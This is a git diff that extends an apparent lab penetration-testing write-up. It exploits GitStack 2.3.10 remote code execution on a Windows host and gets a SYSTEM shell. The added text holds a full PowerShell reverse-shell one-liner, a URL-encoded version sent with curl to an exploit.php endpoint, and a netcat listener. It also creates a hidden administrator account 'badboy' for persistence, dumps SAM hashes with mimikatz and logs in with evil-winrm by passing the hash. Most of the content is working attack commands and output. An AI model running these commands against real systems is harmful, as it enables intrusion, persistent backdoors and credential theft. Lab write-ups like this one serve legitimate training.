@@ -114,7 +114,7 @@ c : Connected to server.
 GitStack - Remote Code Execution                                     | php/webapps/44044.md
 GitStack 2.3.10 - Remote Code Execution                              | php/webapps/43777.py
 ```
-- In exploit, I modified IP addres and run the command.
+- In the exploit, I modified the IP address and run the command.
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/47489c47-0207-46ac-9582-1c37ec3c6ff2)
 
@@ -139,10 +139,80 @@ Registered Owner:          Windows User
 Ping statistics for 10.50.76.115:
     Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
 ```
-- So, now I nned to open a port through ssh connections.
+- So, now I need to open a port through ssh connections.
 ```bash
 firewall-cmd --zone=public --add-port 15500/tcp
 success
 ```
-- Now, transfer netcat binary tothe target host and setup listener.
+- Now, transfer the netcat binary to the target host and set up the listener on port 15500.
 ```bash
+./nc -nvlp 15500
+```
+- Now, I used the powershell reverse command to get a shell.
+```bash
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+- I used to encode the command and using the curl method I got the netcat shell on the ssh connection.
+```
+ curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.96.200%27%2C15500%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A%0A" http://10.200.96.150/web/exploit.php
+```
+```bash
+Ncat: Connection from 10.200.96.150:51806.
+
+PS C:\GitStack\gitphp> whoami
+nt authority\system
+```
+- For persistence, I add a new user, with memeber of administrators and remote management users group.
+```powershell
+ net user badboy password123 /add
+
+ net localgroup 'Administrators' badboy /add
+
+ net localgroup "remote Management Users" badboy /add
+
+ net user badboy
+User name                    badboy
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            05/08/2023 22:23:17
+Password expires             Never
+Password changeable          05/08/2023 22:23:17
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+```
+- Now I logged in using `xfreerdp` with the new added users credentials.
+```bash
+ xfreerdp /u:badboy /p:password123 /v:10.200.96.150 +clipboard /drive:/home/singhx/labs,share
+```
+- By uploading the mimikatz, I dumped sam file and save the administrators hash for future use.
+```powershell
+mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+```
+- I got login using `evil-winrm` by passing the hash of user administrator.
+```
+evil-winrm -i 10.200.96.150 -u administrator -H  37db630168e5f82aafa8461e05c6bbd1
+```
+- Next task is to scan for the network ip 10.200.96.100 for this is use powershell script
